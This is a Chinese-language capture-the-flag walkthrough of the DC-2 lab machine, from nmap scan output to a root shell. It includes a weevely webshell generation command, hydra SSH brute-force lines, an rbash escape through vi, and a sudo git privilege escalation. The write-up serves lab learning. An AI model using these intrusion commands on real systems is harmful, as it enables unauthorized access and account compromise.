PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=dc-2
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://dc-2:80/index.php/what-we-do/%5c%22
|     Form id: search-form-5f919e943a000
|     Form action: http://dc-2/
|     
|     Path: http://dc-2:80/index.php/flag/%5c%22
|     Form id: search-form-5f919e94bb3ff
|_    Form action: http://dc-2/
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 4.7.10
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-server-header: Apache/2.4.10 (Debian)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-wordpress-users: 
| Username found: admin
| Username found: tom
| Username found: jerry
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
|_https-redirect: ERROR: Script execution failed (use -d to debug)
7744/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:0C:29:C6:C1:A4 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/22%OT=80%CT=%CU=39567%PV=Y%DS=1%DC=D%G=N%M=000C29%T
OS:M=5F912E24%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=103%TI=Z%CI=I%II=I
OS:%TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6
OS:=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Uptime guess: 0.010 days (since Thu Oct 22 02:46:02 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.12 ms dc-2 (192.168.242.131)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 03:00
Completed NSE at 03:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 03:00
Completed NSE at 03:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.63 seconds
           Raw packets sent: 25 (1.894KB) | Rcvd: 17 (1.366KB)
```

看起来没什么问题 一个csrf请求漏洞 剩下的啥也没有

渗透又渐渐陷入僵局

## surf_again and failure

又开始无事浏览网站中

我看到press this插件 正在尝试一波用图片木马进行一波钓鱼

但是weevely生成php木马后 转换为.php.jpg格式尝试上传

```
weevely generate s3cr3t ~/Path
```

然而 打开网页之后他会提示我

Unable to create directory wp-content/uploads/2020/10. Is its parent directory writable by the server?

于是 失败~

最后又尝试了一波hydra 的在线ssh密码爆破 

```
hydra -l jerry -P password.txt ssh://192.168.242.131:774
hydra -l root -P password.txt ssh://192.168.242.131:7744
```

都以失败而告终

我们唯一的希望在于我们的tom ssh 的rbash

# rechallenge rbash

在历经千难万险之后 在[gtfobins vi pump shell](https://gtfobins.github.io/gtfobins/vi/) 寻找到了我们最终的归属

其中方法a是被不允许的

只能使用方法b escape 受约束的环境

方法如下

```
vi 				#在command的vi模式下
:set shell=/bin/sh
:shell
```
就可以直接进入不受约束的bash

为什么一定可以?

之前我们调用过一次 compgen -c这条命令 给我们展示出来 我们可以执行的指令 很多都是不受约束的

但是现在尽管已经弹出了shell

很多指令依旧受到限制 显示为 command not found

理应已经解除限制的指令依旧受到约束 通过echo $PATH等展现环境变量的指令

我们不难发现我们的PATH是缺失的

于是..
```
export $PATH=/bin:/usr/bin:$PATH
export $SHELL=/bin/bash:$SHELL
```

这是最难的一关

之前通过less或者echo出来的hint可以知道 

他是在提示我们换用户账号

于是
```
su jerry
Password:#此处的password填写之前爆破出来的jerry 密码 这里依旧存在密码复用 
#尽管登陆用户密码是相同的但是由于jerry没有设置ssh导致我们无法使用ssh来登陆他
```

很好 现在切换到了jerry用户

按照惯例

```
jerry@DC-2:/home/tom$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git

jerry@DC-2:~$ cat *.txt
Good to see that you've made it this far - but you're not home yet. 

You still need to get the final flag (the only flag that really counts!!!).  

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!
```
我们可以发现 我们可以root来使用git指令

这和hint之前留下的信息git outta here!!! 一致

(tom 可以通过使用less /home/jerry/\*.txt 来获得此条hint)

通过查询文档 如GTFOBINS

我们可以获得以下[指令](https://gtfobins.github.io/gtfobins/git/#sudo)

我使用的是 help config的方法
```
sudo /usr/bin/git -p help config
#此处你会看到:在闪烁 然后放心大胆的输入下面一行code就可以git
shell 了

!/bin/sh
```

# success

最后胜利的喜悦

```
# ls
flag4.txt
# whoami
root
# cd /root
# ls
final-flag.txt
# cat final-flag.txt
 __    __     _ _       _                    _ 
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.

```

